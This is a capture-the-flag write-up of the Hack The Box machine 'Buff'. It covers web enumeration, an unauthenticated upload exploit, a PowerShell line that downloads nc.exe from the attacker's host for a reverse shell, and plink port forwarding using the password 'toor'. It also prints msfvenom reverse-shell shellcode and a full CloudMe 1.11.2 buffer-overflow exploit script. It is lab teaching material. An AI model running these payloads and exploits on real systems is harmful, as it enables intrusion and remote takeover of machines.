---
"title": "Hack The Box - Buff"
"date": 2020-11-21
"tags": ["windows", "easy", "plink", "port_forward", "bof"]
"keywords": ["windows", "easy", "plink", "port_forward", "bof"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Link: [https://www.hackthebox.eu/home/machines/profile/263](https://www.hackthebox.eu/home/machines/profile/263)"
"featured_image": "/img/htb-buff/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-buff/Untitled.png)

Link: [https://www.hackthebox.eu/home/machines/profile/263](https://www.hackthebox.eu/home/machines/profile/263)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|7 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

## Webpage Enumeration

The webpage is related to some gym stuffs. Lets dig in.

![Untitled](/img/htb-buff/Untitled%201.png)

### Gobuster Scan Results

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.198:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/19 10:28:35 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/Admin (Status: 301)
/ADMIN (Status: 301)
/admin.cgi (Status: 403)
/admin.pl (Status: 403)
/AT-admin.cgi (Status: 403)
/aux (Status: 403)
/boot (Status: 301)
/cachemgr.cgi (Status: 403)
/cgi-bin/ (Status: 403)
/com1 (Status: 403)
/com2 (Status: 403)
/com3 (Status: 403)
/con (Status: 403)
/ex (Status: 301)
/img (Status: 301)
/include (Status: 301)
/index.php (Status: 200)
/license (Status: 200)
/LICENSE (Status: 200)
/licenses (Status: 403)
/lpt1 (Status: 403)
/lpt2 (Status: 403)
/nul (Status: 403)
/phpmyadmin (Status: 403)
/prn (Status: 403)
/profile (Status: 301)
/server-info (Status: 403)
/server-status (Status: 403)
/upload (Status: 301)
/webalizer (Status: 403)
===============================================================
2020/07/19 10:30:40 Finished
```

`/phpmyadmin` we dont have permission.

![Untitled](/img/htb-buff/Untitled%202.png)

After some Enumeration, In `contact.php` there is a info, that says Made using Gym Management 1.0. So I immediately started searching for any exploits available.

![Untitled](/img/htb-buff/Untitled%203.png)

Found this.

> [https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506)

According to the exploit there is an `/upload.php` page and it does not check for an authenticated user session. And it sets a parameter `id` with that its sends a GET request to a desired filename and it will upload a image, To bypass the extension whitelist we can add a double extension with the last one as acceptable one Eg: png,gif. And send a POST request to the parameter with malicious PHP code in the body.

I got a shell as user `shaun`, but its not stable. I can't move to any other directory.

![Untitled](/img/htb-buff/Untitled%204.png)

So I uploaded a `nc.exe` and got reverse shell from that.

```bash
powershell.exe -command Invoke-WebRequest  -Uri 'http://10.10.14.4:8000/nc.exe' -OutFile C:\xampp\htdocs\gym\upload\nc.exe
```

![Untitled](/img/htb-buff/Untitled%205.png)

Now its works perfect.

![Untitled](/img/htb-buff/Untitled%206.png)

## Privilege Escalation

While looking at user `shaun` directories, I found a executable file called `CloudMe_1112.exe`

### What is CloudMe?

**CloudMe is a file storage service operated by CloudMe AB that offers cloud storage, file synchronization and client software. “CloudMe Sync” client application listening on port 8888.**

```bash
C:\Users\shaun\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  13:27    [DIR](DIR)          .
14/07/2020  13:27    [DIR](DIR)          ..
16/06/2020  16:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   9,096,200,192 bytes free
```

So I checked the listening Ports and its seems port 8888 listening inside the machine.

```bash
[i] Check for services restricted from the outside
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       936
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5008
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       6224
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4308
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       516
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1204
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1664
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2288
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       684
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       664
  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       1632
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       5660
```

So We can do Port forwarding using Plink.

> [https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

Before doing we need to do some small changes, We need to PermitRootLogin and restart ssh service.

```bash
root@kali:~# vi /etc/ssh/sshd_config

# Authentication:

#LoginGraceTime 2m
PermitRootLogin yes
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

root@kali:~# service ssh restart
root@kali:~# service ssh start
```

Now in the box, upload the plink and now we can remote port forward the port 8888 with this plink tool.

```bash
C:\temp>.\plink.exe root@10.10.14.3 -R 8888:127.0.0.1:8888
.\plink.exe root@10.10.14.3 -R 8888:127.0.01:8888
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 48:34:e6:01:5f:9f:51:07:6c:27:4f:98:82:4c:22:5b
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y
Using username "root".
root@10.10.14.3's password: toor

Linux kali 5.7.0-kali1-amd64 #1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

Once its done u will get back to your kali terminal.

By using netstat command we can see that port 8888 is listening on our localhost. So Port forwarding works perfectly.

```bash
root@kali:~# netstat -ano | grep 8888
netstat -ano | grep 8888
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 ::1:8888                :::*                    LISTEN      off (0.00/0/0)
```

I found this exploit available for that CloudMe Version.

> [https://www.exploit-db.com/exploits/48389](https://www.exploit-db.com/exploits/48389)

Generated a reverse shell payload using msfvenom.

```bash
root@kali:~/CTF/HTB/Boxes/Buff# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of c file: 1386 bytes
unsigned char buf[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x04\x68"
"\x02\x00\x04\xd2\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
```

Changed the whole python thing with this `C` formatted shellcode. For some reason python shellcode created by msfvenom have some issues like both C and Python Shellcode seems different totally. And Python didn't worked for me. So I tried with C shellcode this time.

```bash
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
shellcode=("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x04\x68"
"\x02\x00\x04\xd2\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")

overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + shellcode))	

buf = padding1 + EIP + NOPS + shellcode + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
```

Started nc on another side and started the python script.

```bash
root@kali:~/CTF/HTB/Boxes/Buff# python 48389.py
python 48389.py
```

We got the shell as Administrator.

![Untitled](/img/htb-buff/Untitled%207.png)

We own the box.